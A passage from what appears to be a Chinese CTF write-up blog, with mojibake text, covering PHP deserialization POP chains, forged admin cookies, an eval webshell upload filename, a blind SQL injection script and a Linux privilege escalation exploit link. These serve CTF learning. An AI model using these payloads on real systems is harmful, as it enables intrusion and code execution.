<h3 id="0x04-Ciscn-æ€»å†³èµ›-Laravel"><a href="#0x04-Ciscn-æ€»å†³èµ›-Laravel" class="headerlink" title="0x04 Ciscn æ€»å†³èµ› Laravel"></a>0x04 Ciscn æ€»å†³èµ› Laravel</h3><p>laravelçš„1Dayæ¼æ´ï¼ŒæŒ‰ç†è¯´è¿™é¢˜æ˜¯å¾ˆéš¾çš„ï¼Œåªä¸è¿‡å‡ºé¢˜äººç•™äº†ä¸ªsessionæ–‡ä»¶ï¼Œé‡Œé¢æœ‰payloadï¼Œç›´æ¥æ”¹ä¸‹å°±å¯ä»¥ç”¨ï¼Œè™½ç„¶è¯´ç°åœºæ—¶æˆ‘æ˜¯ç¡¬æŒ–~ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exploit</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $deferred = <span class="keyword">array</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;pool = $x;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $setInnerItem = <span class="string">'system'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $innerItem = <span class="string">'cat /flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> \Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">new</span> \Symfony\Component\Cache\Adapter\ProxyAdapter());</span><br><span class="line">$a-&gt;deferred = <span class="keyword">array</span>(<span class="string">'aa'</span>=&gt;<span class="keyword">new</span> \Symfony\Component\Cache\CacheItem);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">O%<span class="number">3</span>A47%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>deferred%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">22</span>aa%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CCacheItem%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>innerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>pool%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>setInnerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>æ¯”èµ›ä¸­ä¿®å¤æ˜¯é€šè¿‡ç›´æ¥åˆ é™¤TagAwareAdapterä¸­çš„__destructé­”æœ¯æ–¹æ³•è¿›è¡ŒåŠ å›º</p>
<h3 id="0x05-Ciscn-æ€»å†³èµ›-easyweb"><a href="#0x05-Ciscn-æ€»å†³èµ›-easyweb" class="headerlink" title="0x05 Ciscn æ€»å†³èµ› easyweb"></a>0x05 Ciscn æ€»å†³èµ› easyweb</h3><p>æ¼æ´ç‚¹åº”è¯¥ä¸æ˜¯ä¸€ä¸ªï¼Œè§£é¢˜æ—¶åˆ©ç”¨çš„æ˜¯uploadå¤„çš„file_put_contentsï¼Œç”±äºä¼šå°†æ–‡ä»¶åå†™å…¥.log.phpæ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ¤å…¥ä»»æ„ä»£ç ï¼Œä¸­é—´å°±ä¸€ä¸ªè¿‡æ¥phpï¼Œå¯ä»¥åˆ©ç”¨<?= ?>æ¥æ‰§è¡Œphpä»£ç ï¼ˆè¿™é‡Œä¸€å®šè¦é—­åˆï¼‰ï¼Œä¸è¿‡åˆ°è¾¾ä¸Šä¼ ç‚¹éœ€è¦å…ˆç™»å½•ï¼Œåœ¨user.phpå’Œupload.phpä¸­éƒ½éœ€è¦ <strong>username===admin</strong> åˆ†æä»£ç <br>function.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $username,$secret;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"username"</span>]))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $username=decode($_COOKIE[<span class="string">"username"</span>],$secret);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†™è„šæœ¬è®¡ç®—cookie</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str,$key)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $tmp=<span class="string">""</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $tmp .= chr(ord($str[$i])^ord($key[$i%strlen($key)]));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> base64_encode($tmp);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$secret=<span class="string">"!*(fp60zoy"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> encode(<span class="string">'admin'</span>,$secret);</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°<strong>cookie[â€˜usernameâ€™] = QE5FDx4=</strong>ï¼Œåˆ°user.phpä¸­å‘åŒ…å³å¯</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">"file"</span>; <span class="attribute">filename</span>=<span class="string">"&lt;?= eval(<span class="variable">$_REQUEST</span>[pass]);?&gt;"</span></span><br><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure>

<h3 id="0x06-é«˜æ˜çš„é»‘å®¢"><a href="#0x06-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="0x06 é«˜æ˜çš„é»‘å®¢"></a>0x06 é«˜æ˜çš„é»‘å®¢</h3><p>ï¼ˆå¼ºç½‘æ¯çº¿ä¸Šé¢˜ï¼‰</p>
<p>æˆ‘è§£è¿™é¢˜æ˜¯é€šè¿‡çˆ†ç ´è§£çš„ ~~ï¼Œå†™äº†ä¸€ä¸ªè„šæœ¬ï¼ŒæŠ“å–æ–‡ä»¶ä¸­$_GETå’Œ$_POSTé‡Œçš„å‚æ•°ï¼Œç„¶åé€šè¿‡å‘é€è¯·æ±‚åŒ…æ‰§è¡Œecho xxxxx;çš„å‘½ä»¤ï¼Œå¦‚æœxxxxxå‡ºäº†ï¼Œè¯´æ˜æ‰§è¡ŒæˆåŠŸäº†ï¼Œä¹Ÿå°±æ˜¯æ‰¾åˆ°åé—¨äº†ï¼Œç»“æœçœŸçš„è·‘å‡ºæ¥äº†ã€‚</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#find.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Cyc1e</span></span><br><span class="line"><span class="comment"># @Date:   2019-05-25 12:12:51</span></span><br><span class="line"><span class="comment"># @Last Modified by:   Cyc1e</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2019-05-25 12:23:34</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">flies = os.listdir(<span class="string">'./src'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flies:</span><br><span class="line">	url = <span class="string">'http://127.0.0.1/src/'</span>+i</span><br><span class="line">	f = open(<span class="string">'./src/'</span>+i)</span><br><span class="line">	bb = f.read()</span><br><span class="line">	f.close()</span><br><span class="line">	rr = re.compile(<span class="string">r'(?&lt;=_GET\[\').*(?=\'\])'</span>)</span><br><span class="line">	aa = rr.findall(bb)</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> aa:</span><br><span class="line">		payload = url + <span class="string">'/?'</span> + c + <span class="string">'=phpinfo();'</span></span><br><span class="line">		print payload</span><br><span class="line">		req.requests.get(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Windows NT C 6.1 build'</span> <span class="keyword">in</span> req.content:</span><br><span class="line">			print payload</span><br><span class="line">			<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>æœ€åæ‰¾åˆ°æ˜¯xk0SzyKwfzw.phpï¼Œäº¤äº’å‚æ•°ä¸ºï¼šEfa5BVG</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#xk0SzyKwfzw.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">$XnEGfa = $_GET[<span class="string">'Efa5BVG'</span>] ?? <span class="string">' '</span>;</span><br><span class="line">$aYunX = <span class="string">"sY"</span>;</span><br><span class="line">$aYunX .= <span class="string">"stEmXnsTcx"</span>;</span><br><span class="line">$aYunX = explode(<span class="string">'Xn'</span>, $aYunX);</span><br><span class="line">$kDxfM = <span class="keyword">new</span> stdClass();</span><br><span class="line">$kDxfM-&gt;gHht = $aYunX[<span class="number">0</span>];</span><br><span class="line">($kDxfM-&gt;gHht)($XnEGfa);</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­$kDxfM-&gt;gHht çš„å€¼ä¸º sYstEmï¼Œæ‰€ä»¥ä¼ ä¸ªå‘½ä»¤å°±å¥½äº†ã€‚</p>
<h3 id="0x07-upload"><a href="#0x07-upload" class="headerlink" title="0x07 upload"></a>0x07 upload</h3><p>ï¼ˆå¼ºç½‘æ¯çº¿ä¸Šé¢˜ï¼‰</p>
<p>è€ƒç‚¹ä¸ºä¿¡æ¯æ”¶é›†+ååºåˆ—åŒ–åˆ©ç”¨ï¼Œç›´æ¥è®¿é—®<code>www.tar.gz</code>è·å¾—æºç ã€‚æ€è·¯ä¸ºï¼šä¸Šä¼ ä¸€ä¸ªå«æœ‰ä¸€å¥è¯æœ¨é©¬çš„å›¾ç‰‡ï¼Œé€šè¿‡ååºåˆ—åŒ–æ¼æ´å°†pngå›¾ç‰‡ä¿®æ”¹ä¸ºphpæ–‡ä»¶å…¶ä¸­ååºåˆ—åŒ–ç‚¹åœ¨Index.phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åºåˆ—åŒ–ç‚¹åœ¨Login.phphä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($user_info) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($password) === $user_info[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        $cookie_data=base64_encode(serialize($user_info));</span><br><span class="line">        cookie(<span class="string">"user"</span>,$cookie_data,<span class="number">3600</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;success(<span class="string">'Login successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Login failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ååºåˆ—åŒ–çš„å‚æ•°å€¼å–è‡ªäºcookie[â€˜userâ€™]ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œå¹¶ä¸”åœ¨Prifile.phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸ä¸Šä¼ æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œå³empty($_FILES)ä¸ºçœŸå€¼æ—¶ï¼Œè§¦å‘upload_img()å³å¯ä¿®æ”¹æ–‡ä»¶åæ‰€ä»¥æ”»å‡»é“¾ä¸ºRegisterä¸­çš„<strong>destruct -&gt;Profileä¸­çš„</strong>call-&gt;__get-&gt;upload_img</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exploit</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="comment">//include('Index.php');</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$check = <span class="keyword">new</span> Register();</span><br><span class="line">$check-&gt;registed=<span class="number">0</span>;</span><br><span class="line">$check-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">$check-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">$check-&gt;checker-&gt;ext=<span class="number">1</span>;</span><br><span class="line">$check-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/2b7bc98024d801eda1d1f9120e838398/fb5c81ed3a220004b71069645f112867.png"</span>;</span><br><span class="line">$check-&gt;checker-&gt;filename=<span class="string">"./upload/2b7bc98024d801eda1d1f9120e838398/fb5c81ed3a220004b71069645f112867.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($check));</span><br></pre></td></tr></table></figure>
<p>æ²¡æ‰¾åˆ°flag<del>~</del></p>
<h3 id="0x08-Hack-word"><a href="#0x08-Hack-word" class="headerlink" title="0x08 Hack word"></a>0x08 Hack word</h3><p>ä¸€é“ç›²æ³¨é¢˜ï¼Œè¯­å¥ï¼šid=if(ascii(substr((select(flag)from(flag)),1,1))=102,2,1)ï¼Œå…¶ä¸­select(xx)from(xx)çš„ç”¨æ³•ï¼Œéœ€è¦çŸ¥é“åˆ—åæ‰å¯ä»¥ç”¨ï¼Œé¢˜ç›®ç›´æ¥ç»™äº†ï¼Œæ‰€ä»¥ç›´æ¥ç”¨è„šæœ¬è·‘å°±å¥½äº†ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span>=<span class="string">'http://web43.buuoj.cn/index.php'</span></span><br><span class="line">ll = <span class="string">'fqwertyuiopasdfghjklzxcvbnm&#125;&#123;1234567890'</span></span><br><span class="line"><span class="attribute">flag</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,50):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> ll:</span><br><span class="line">		cha = ord(j)</span><br><span class="line">		<span class="attribute">ss</span>=<span class="string">'if(ascii(substr((select(flag)from(flag)),%s,1))=%s,2,1)'</span>%(i,cha)</span><br><span class="line">		sql=&#123;<span class="string">"id"</span>:ss&#125;</span><br><span class="line">		<span class="attribute">req</span>=requests.post(url=url,data=sql)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Do you want"</span> <span class="keyword">in</span> req.content.decode(<span class="string">'UTF-8'</span>):</span><br><span class="line">			flag+=j</span><br><span class="line">			<span class="builtin-name">print</span>(flag)</span><br><span class="line">			break</span><br><span class="line"><span class="builtin-name">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="0x09-piapiapia"><a href="#0x09-piapiapia" class="headerlink" title="0x09 piapiapia"></a>0x09 piapiapia</h3><p>è®¿é—®<a href="http://www.zipå¯ä»¥æ‹¿åˆ°æºç ï¼Œæ‰€ä»¥ä¸»è¦å°±æ˜¯ä»£ç å®¡è®¡çš„äº‹æƒ…ï¼Œä¸è¿‡åœ¨æŸ¥çœ‹ç½‘é¡µæºç çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³æ–‡ä»¶çš„base64å€¼ï¼Œæ‰€ä»¥æ€è·¯ä¹Ÿå°±æ˜¯è®©photoå¯¹åº”çš„æ–‡ä»¶ä¸ºconfig.phpæ–‡ä»¶ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚" target="_blank" rel="noopener">www.zipå¯ä»¥æ‹¿åˆ°æºç ï¼Œæ‰€ä»¥ä¸»è¦å°±æ˜¯ä»£ç å®¡è®¡çš„äº‹æƒ…ï¼Œä¸è¿‡åœ¨æŸ¥çœ‹ç½‘é¡µæºç çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°ç›¸å…³æ–‡ä»¶çš„base64å€¼ï¼Œæ‰€ä»¥æ€è·¯ä¹Ÿå°±æ˜¯è®©photoå¯¹åº”çš„æ–‡ä»¶ä¸ºconfig.phpæ–‡ä»¶ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</a></p>
<h3 id="0x0A-admin"><a href="#0x0A-admin" class="headerlink" title="0x0A admin"></a>0x0A admin</h3><p> (HCTFçš„é¢˜ç›®)</p>
<p>è¿™é¢˜ä¸€å…±æœ‰ä¸‰ä¸ªè§£æ³•ï¼Œé¢˜ç›®æºç åœ¨ç™»å…¥ä»»æ„è´¦å·ååˆ°æ”¹å¯†ç é¡µé¢æœ‰æç¤ºï¼š<a href="https://github.com/woadsl1234/hctf_flask/ï¼Œæœ¬é¢˜çš„ä¸»è¦è€ƒç‚¹åœ¨äºUnicodeæ¬ºéª—ï¼Œæ‰€ä»¥è¿™é‡Œåªè®°å½•è¯¥è§£æ³•ï¼Œå…¶ä¸­routes.py" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/ï¼Œæœ¬é¢˜çš„ä¸»è¦è€ƒç‚¹åœ¨äºUnicodeæ¬ºéª—ï¼Œæ‰€ä»¥è¿™é‡Œåªè®°å½•è¯¥è§£æ³•ï¼Œå…¶ä¸­routes.py</a></p>
<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">def <span class="keyword">register</span>():</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">POST</span>':</span></span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">    ......</span><br><span class="line">def login():</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">POST</span>':</span></span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">    ......</span><br><span class="line">def change():</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> request<span class="function">.<span class="keyword">method</span> == '<span class="title">POST</span>':</span></span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br></pre></td></tr></table></figure>
<p>ç»è¿‡äº†ä¸‰æ¬¡çš„strlowerå°å†™è½¬æ¢ï¼Œå…¶ä¸­strlowå‡½æ•°ä¸º</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span></span><span class="symbol">:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<p>è¯¥ç‰ˆæœ¬çš„Twistedåº“å¯¹äºUnicodeä¸­çš„Small Capitalï¼Œä¾‹å¦‚á´€çš„è½¬æ¢è¿‡ç¨‹ä¸ºá´€ -&gt; A -&gt; aï¼Œæ°å¥½ä»£ç ä¸­çš„æ³¨å†Œï¼Œç™»å½•ï¼Œæ”¹å¯†ç æ“ä½œä¸­æ‰§è¡Œçš„nodeprep.prepare()æ¬¡æ•°è¶³å¤Ÿå°†á´€á´…á´ÉªÉ´è½¬æˆadmin,ä¹Ÿå°±æ˜¯æ³¨å†Œä¸€ä¸ªá´€á´…á´ÉªÉ´è´¦å·ï¼Œç»•åç™»å½•åä¿®æ”¹å¯†ç æ—¶ä¿®æ”¹çš„æ—¶adminè´¦å·çš„å¯†ç ã€‚è¯¥é¢˜æœ‰ä¸‰ä¸ªè§£æ³•ï¼Œå…¶ä»–è§£æ³•é˜”ä»¥çœ‹çœ‹é£˜é›¶å…„å†™çš„æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
<h3 id="0x0B-DE1CTFèµ›é¢˜"><a href="#0x0B-DE1CTFèµ›é¢˜" class="headerlink" title="0x0B DE1CTFèµ›é¢˜"></a>0x0B DE1CTFèµ›é¢˜</h3><p>å‚è€ƒæœ¬èœçš„De1CTF web wpå³å¯ï¼š<a href="https://www.jianshu.com/p/0a02f4ff6a7e" target="_blank" rel="noopener">https://www.jianshu.com/p/0a02f4ff6a7e</a> </p>
<p><strong>æœ€è¿‘å¤ªå¿™äº†ï¼Œæ²¡æ—¶é—´åˆ·é¢˜äº†ï¼Œæœ‰æ—¶é—´å†å†™</strong></p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-13272 Linuxæœ¬åœ°ææƒæ¼æ´å¤ç°</title>
    <url>/2019/07/31/CVE-2019-13272-Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="0x01-ç›¸å…³ä¿¡æ¯"><a href="#0x01-ç›¸å…³ä¿¡æ¯" class="headerlink" title="0x01 ç›¸å…³ä¿¡æ¯"></a>0x01 ç›¸å…³ä¿¡æ¯</h3><p>æ¼æ´ç±»å‹ï¼šLinuxæœ¬åœ°ææƒ<br>æ¼æ´å½±å“èŒƒå›´ï¼šLinuxå†…æ ¸ç‰ˆæœ¬ä½äº5.1.17<br>æµ‹è¯•ä¸»æœºä¿¡æ¯ï¼š</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Linux ubuntu <span class="number">4.15</span><span class="number">.0</span><span class="number">-30</span>-generic #<span class="number">32</span>-Ubuntu SMP Thu Jul <span class="number">26</span> <span class="number">17</span>:<span class="number">42</span>:<span class="number">43</span> UTC <span class="number">2018</span> x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
<h3 id="Exploitæµ‹è¯•"><a href="#Exploitæµ‹è¯•" class="headerlink" title="Exploitæµ‹è¯•"></a>Exploitæµ‹è¯•</h3><p>EXPä¸‹è½½ï¼š<a href="https://github.com/Cyc1eC/CVE-2019-13272" target="_blank" rel="noopener">exploitä¸‹è½½åœ°å€</a>ï¼Œè¿›è¡Œç¼–è¯‘è¿è¡Œå³å¯è·å¾—æœ¬åœ°rootæƒé™ï¼ˆ<em>éœ€è¦äº¤äº’å¼shell</em>ï¼‰</p>
